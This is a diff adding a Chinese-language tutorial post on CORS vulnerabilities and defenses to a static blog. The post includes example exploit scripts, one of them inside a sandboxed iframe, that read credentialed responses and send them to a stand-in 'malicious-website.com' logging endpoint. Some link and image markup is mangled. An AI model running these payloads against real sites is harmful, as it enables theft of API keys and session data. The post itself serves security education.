@@ -191,6 +191,93 @@
 
 
   
+    <article id="post-CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/15/CORS/" class="article-date">
+  <time class="dt-published" datetime="2025-02-14T16:07:17.000Z" itemprop="datePublished">2025-02-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/15/CORS/">CORS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>在本节中，我们将解释跨源资源共享（CORS）是什么，描述一些基于跨源资源共享的常见攻击示例，并讨论如何防范这些攻击。</p>
+<h2 id="什么是-CORS（跨源资源共享）？"><a href="#什么是-CORS（跨源资源共享）？" class="headerlink" title="什么是 CORS（跨源资源共享）？"></a>什么是 CORS（跨源资源共享）？</h2><p>跨源资源共享（CORS）是一种浏览器机制，它允许对特定域之外的资源进行受控访问。它扩展了同源策略（SOP）并增加了其灵活性。然而，如果网站的 CORS 策略配置和实施不当，它也会为跨域攻击提供可乘之机。CORS 并不能防范诸如跨站请求伪造（CSRF）之类的跨源攻击 。</p>
+<p>跨源资源共享示意图<br>[！跨源资源共享示意图]（</p>
+<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是一种限制性的跨源规范，它限制了网站与源域之外的资源进行交互的能力。同源策略是多年前为应对潜在的恶意跨域交互（例如一个网站窃取另一个网站的私人数据）而制定的。它通常允许一个域向其他域发出请求，但不允许访问响应内容。</p>
+<h2 id="同源策略的放宽"><a href="#同源策略的放宽" class="headerlink" title="同源策略的放宽"></a>同源策略的放宽</h2><p>同源策略非常严格，因此人们想出了各种方法来规避这些限制。许多网站以需要完全跨源访问的方式与子域或第三方站点进行交互。使用跨源资源共享（CORS）可以对同源策略进行有控制的放宽。</p>
+<p>跨源资源共享协议使用一组 HTTP 头，这些头定义了受信任的网络源以及相关属性，例如是否允许经过身份验证的访问。这些头在浏览器与它试图访问的跨源网站之间的头信息交换中组合使用。</p>
+<h2 id="由-CORS-配置问题引发的漏洞"><a href="#由-CORS-配置问题引发的漏洞" class="headerlink" title="由 CORS 配置问题引发的漏洞"></a>由 CORS 配置问题引发的漏洞</h2><p>许多现代网站使用 CORS 来允许来自子域和受信任第三方的访问。它们对 CORS 的实现可能存在错误，或者为了确保一切正常运行而过于宽松，这可能会导致可被利用的漏洞。</p>
+<h3 id="根据客户端指定的-Origin-头发送服务器生成的-ACAO-头"><a href="#根据客户端指定的-Origin-头发送服务器生成的-ACAO-头" class="headerlink" title="根据客户端指定的 Origin 头发送服务器生成的 ACAO 头"></a>根据客户端指定的 Origin 头发送服务器生成的 ACAO 头</h3><p>一些应用程序需要向多个其他域提供访问权限。维护一个允许的域列表需要持续的努力，而且任何错误都可能导致功能出现问题。因此，一些应用程序选择了简单的方法，实际上允许来自任何其他域的访问。<br>实现这一点的一种方法是读取请求中的 Origin 头，并在响应头中声明允许请求的源。例如，假设一个应用程序收到以下请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: https://malicious-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
+<p>然后它的响应如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://malicious-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true ...</span><br></pre></td></tr></table></figure>
+<p>这些头信息表明允许来自请求域（malicious-website.com）的访问，并且跨源请求可以包含 cookie（Access-Control-Allow-Credentials: true），因此将在会话中进行处理。</p>
+<p>因为应用程序在 Access-Control-Allow-Origin 头中反映任意来源，这意味着任何域都可以访问易受攻击域的资源。如果响应包含任何敏感信息，例如 API 密钥或 CSRF 令牌，您可以通过在自己的网站上放置以下脚本来获取这些信息：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">req.<span class="property">onload</span> = reqListener; </span><br><span class="line">req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://vulnerable-website.com/sensitive-victim-data&#x27;</span>,<span class="literal">true</span>); </span><br><span class="line">req.<span class="property">withCredentials</span> = <span class="literal">true</span>; req.<span class="title function_">send</span>(); </span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) &#123;     </span><br><span class="line">       location=<span class="string">&#x27;//malicious-website.com/log?key=&#x27;</span>+<span class="variable language_">this</span>.<span class="property">responseText</span>; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="解析-Origin-头时出错"><a href="#解析-Origin-头时出错" class="headerlink" title="解析 Origin 头时出错"></a>解析 Origin 头时出错</h3><p>一些支持来自多个源访问的应用程序通过使用允许来源的白名单来实现这一点。当收到 CORS 请求时，会将提供的来源与白名单进行比较。如果来源出现在白名单中，那么它将被反映在 Access-Control-Allow-Origin 头中，从而授予访问权限。例如，应用程序收到一个正常请求，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /data HTTP/1.1 </span><br><span class="line">Host: normal-website.com </span><br><span class="line">... </span><br><span class="line">Origin: https://innocent-website.com</span><br></pre></td></tr></table></figure>
+<p>应用程序会将提供的来源与它的允许来源列表进行检查，如果在列表中，则如下反映来源：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">... </span><br><span class="line">Access-Control-Allow-Origin: https://innocent-website.com</span><br></pre></td></tr></table></figure>
+<p>在实现 CORS 来源白名单时经常会出现错误。一些组织决定允许来自其所有子域（包括尚未存在的未来子域）的访问。还有一些应用程序允许来自其他各种组织的域（包括其子域）的访问。这些规则通常通过匹配 URL 前缀或后缀，或使用正则表达式来实现。实现过程中的任何错误都可能导致向意外的外部域授予访问权限。</p>
+<p>例如，假设一个应用程序授予对所有以<a target="_blank" rel="noopener" href="http://normal-website.com结尾的域的访问权限.攻击者可能通过注册http//hackersnormal-website.com%E5%9F%9F%E6%9D%A5%E8%8E%B7%E5%BE%97%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82%E6%88%96%E8%80%85%EF%BC%8C%E5%81%87%E8%AE%BE%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%88%E4%BA%88%E5%AF%B9%E6%89%80%E6%9C%89%E4%BB%A5http://normal-website.com%E5%BC%80%E5%A4%B4%E7%9A%84%E5%9F%9F%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E8%83%BD%E4%BD%BF%E7%94%A8http://normal-website.com.evil-user.net%E5%9F%9F%E6%9D%A5%E8%8E%B7%E5%BE%97%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82">http://normal-website.com结尾的域的访问权限。攻击者可能通过注册http://hackersnormal-website.com域来获得访问权限。或者，假设一个应用程序授予对所有以http://normal-website.com开头的域的访问权限。攻击者可能使用http://normal-website.com.evil-user.net域来获得访问权限。</a></p>
+<h3 id="白名单中的-null-来源值"><a href="#白名单中的-null-来源值" class="headerlink" title="白名单中的 null 来源值"></a>白名单中的 null 来源值</h3><p>Origin 头的规范支持 null 值。浏览器可能在各种不寻常的情况下在 Origin 头中发送 null 值：跨源重定向；来自序列化数据的请求；使用 file: 协议的请求；沙盒化的跨源请求。<br>一些应用程序可能会将 null 来源列入白名单，以支持应用程序的本地开发。例如，假设一个应用程序收到以下跨源请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: null</span><br></pre></td></tr></table></figure>
+<p>服务器响应如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: null </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
+<p>在这种情况下，攻击者可以使用各种技巧生成一个 Origin 头中包含 null 值的跨源请求。这将满足白名单要求，从而导致跨域访问。例如，可以使用如下形式的沙盒化 iframe 跨源请求来实现：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation</span></span></span><br><span class="line"><span class="string"><span class="tag">allow-forms&quot;</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;script&gt; </span></span></span><br><span class="line"><span class="string"><span class="tag">    var req = new XMLHttpRequest(); </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.onload = reqListener; </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.open(&#x27;get&#x27;,&#x27;vulnerable-website.com/sensitive-victim-data&#x27;,true); </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.withCredentials = true; req.send();  </span></span></span><br><span class="line"><span class="string"><span class="tag">    function reqListener() </span></span></span><br><span class="line"><span class="string"><span class="tag">    &#123; </span></span></span><br><span class="line"><span class="string"><span class="tag">        location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText; </span></span></span><br><span class="line"><span class="string"><span class="tag">    &#125;; </span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="通过-CORS-信任关系利用-XSS-漏洞"><a href="#通过-CORS-信任关系利用-XSS-漏洞" class="headerlink" title="通过 CORS 信任关系利用 XSS 漏洞"></a>通过 CORS 信任关系利用 XSS 漏洞</h3><p>即使是 “正确” 配置的 CORS 也会在两个源之间建立信任关系。如果一个网站信任一个容易受到跨站脚本（XSS）攻击的源，那么攻击者就可以利用 XSS 漏洞注入一些 JavaScript 代码，利用 CORS 从信任这个易受攻击应用程序的网站上检索敏感信息。<br>假设收到以下请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/requestApiKey HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: https://subdomain.vulnerable-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
+<p>如果服务器响应如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
+<p>那么在subdomain.vulnerable-website.com上发现 XSS 漏洞的攻击者就可以利用这个漏洞来检索 API 密钥，使用类似这样的 URL：</p>
+<p><a target="_blank" rel="noopener" href="https://subdomain.vulnerable-website.com/?xss=">https://subdomain.vulnerable-website.com/?xss=</a><script>cors-stuff-here</script></p>
+<h3 id="配置不当的-CORS-破坏-TLS-安全"><a href="#配置不当的-CORS-破坏-TLS-安全" class="headerlink" title="配置不当的 CORS 破坏 TLS 安全"></a>配置不当的 CORS 破坏 TLS 安全</h3><p>假设一个严格使用 HTTPS 的应用程序也将一个使用普通 HTTP 的受信任子域列入白名单。例如，当应用程序收到以下请求时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/requestApiKey HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: http://trusted-subdomain.vulnerable-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
+<p>应用程序响应如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
+<p>在这种情况下，能够拦截受害者用户流量的攻击者可以利用 CORS 配置来危害受害者与应用程序的交互。此攻击涉及以下步骤：</p>
+<p>受害者用户发出任何普通 HTTP 请求。<br>攻击者注入一个重定向到<a target="_blank" rel="noopener" href="http://trusted-subdomain.vulnerable-website.com./">http://trusted-subdomain.vulnerable-website.com。</a><br>受害者的浏览器跟随重定向。<br>攻击者拦截普通 HTTP 请求，并返回一个包含对<a target="_blank" rel="noopener" href="https://vulnerable-website.com的/">https://vulnerable-website.com的</a> CORS 请求的伪造响应。<br>受害者的浏览器发出 CORS 请求，其中包含来源<a target="_blank" rel="noopener" href="http://trusted-subdomain.vulnerable-website.com./">http://trusted-subdomain.vulnerable-website.com。</a><br>应用程序允许该请求，因为这是一个列入白名单的来源。请求的敏感数据在响应中返回。<br>攻击者的伪造页面可以读取敏感数据并将其传输到攻击者控制的任何域。<br>即使易受攻击的网站在其他方面对 HTTPS 的使用很安全，没有 HTTP 端点，并且所有 cookie 都标记为安全，这种攻击仍然有效。</p>
+<h3 id="内联网和无凭据的-CORS"><a href="#内联网和无凭据的-CORS" class="headerlink" title="内联网和无凭据的 CORS"></a>内联网和无凭据的 CORS</h3><p>大多数 CORS 攻击依赖于响应头Access-Control-Allow-Credentials: true的存在。如果没有这个头，受害者用户的浏览器将拒绝发送他们的 cookie，这意味着攻击者只能访问未经身份验证的内容，而他们通过直接浏览目标网站也能同样轻松地访问这些内容。<br>然而，有一种常见的情况是攻击者无法直接访问网站：当它是某个组织内联网的一部分，并且位于私有 IP 地址空间内时。内部网站的安全标准通常低于外部网站，这使得攻击者能够发现漏洞并获得进一步的访问权限。例如，私有网络内的跨源请求可能如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /reader?url=doc1.pdf </span><br><span class="line">Host: intranet.normal-website.com </span><br><span class="line">Origin: https://normal-website.com</span><br></pre></td></tr></table></figure>
+<p>服务器响应如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
+<p>应用服务器信任来自任何来源的无凭据资源请求。如果私有 IP 地址空间内的用户访问公共互联网，那么外部站点就可以利用受害者的浏览器作为代理来访问内联网资源，从而进行基于 CORS 的攻击。</p>
+<h2 id="如何防范基于-CORS-的攻击"><a href="#如何防范基于-CORS-的攻击" class="headerlink" title="如何防范基于 CORS 的攻击"></a>如何防范基于 CORS 的攻击</h2><p>CORS 漏洞主要是由于配置错误引起的。因此，防范 CORS 漏洞是一个配置问题。以下部分描述了一些针对 CORS 攻击的有效防御措施。</p>
+<h3 id="正确配置跨源请求"><a href="#正确配置跨源请求" class="headerlink" title="正确配置跨源请求"></a>正确配置跨源请求</h3><p>如果一个网络资源包含敏感信息，应该在 Access-Control-Allow-Origin 头中正确指定来源。</p>
+<h3 id="仅允许受信任的站点"><a href="#仅允许受信任的站点" class="headerlink" title="仅允许受信任的站点"></a>仅允许受信任的站点</h3><p>这似乎是显而易见的，但 Access-Control-Allow-Origin 头中指定的来源应该只是受信任的站点。特别是，在没有验证的情况下动态反映跨源请求中的来源很容易被利用，应该避免这种情况。</p>
+<h3 id="避免将-null-列入白名单"><a href="#避免将-null-列入白名单" class="headerlink" title="避免将 null 列入白名单"></a>避免将 null 列入白名单</h3><p>避免使用Access-Control-Allow-Origin: null头。内部文档和沙盒化请求的跨源资源调用可以指定 null 来源。对于私有和公共服务器，应该根据受信任的来源正确定义 CORS 头。</p>
+<h3 id="在内部网络中避免使用通配符"><a href="#在内部网络中避免使用通配符" class="headerlink" title="在内部网络中避免使用通配符"></a>在内部网络中避免使用通配符</h3><p>在内部网络中避免使用通配符。当内部浏览器可以访问不受信任的外部域时，仅依靠网络配置来保护内部资源是不够的。</p>
+<h3 id="CORS-不能替代服务器端安全策略"><a href="#CORS-不能替代服务器端安全策略" class="headerlink" title="CORS 不能替代服务器端安全策略"></a>CORS 不能替代服务器端安全策略</h3><p>CORS 定义了浏览器的行为，它永远不能替代服务器端对敏感数据的保护 —— 攻击者可以直接伪造来自任何受信任来源的请求。因此，除了正确配置 CORS 之外，Web 服务器还应该继续对敏感数据应用保护措施，例如身份验证和会话管理。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://amiduai.github.io/2025/02/15/CORS/" data-id="cm74zu18q0000d46scl4rcrl9" data-title="CORS" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-API测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/10/API%E6%B5%8B%E8%AF%95/" class="article-date">
@@ -367,6 +454,10 @@
         
           <li>
             <a href="/2025/02/15/CSRF(2)/">绕过 CSRF 令牌验证</a>
+          </li>
+        
+          <li>
+            <a href="/2025/02/15/CORS/">CORS</a>
           </li>
         
           <li>
